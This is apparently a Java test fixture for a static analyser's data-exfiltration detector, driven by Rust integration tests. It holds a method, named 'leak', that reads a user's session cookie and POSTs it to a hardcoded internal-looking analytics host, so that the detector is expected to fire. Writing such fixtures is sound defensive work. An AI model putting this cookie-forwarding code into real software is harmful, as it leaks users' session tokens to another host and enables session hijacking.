// DATA_EXFIL fixture: java.net.http chain.  A Sensitive source (cookie)
// flows through `BodyPublishers.ofString(payload)` and the request
// builder chain into `client.send(req)` at a hardcoded URL.  SSRF must
// NOT fire (URL is a fixed string) and `Cap::DATA_EXFIL` must fire
// because the cookie is exactly the cross-boundary state the cap
// targets.
//
// Driven by `data_exfil_java_integration_tests.rs`.
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;

public class DataExfilJdkHttpClient {
    public void leak(HttpServletRequest request) throws Exception {
        Cookie[] cookies = request.getCookies();
        String session = cookies[0].getValue();
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create("https://analytics.internal/track"))
            .POST(BodyPublishers.ofString(session))
            .build();
        client.send(req, BodyHandlers.ofString());
    }
}
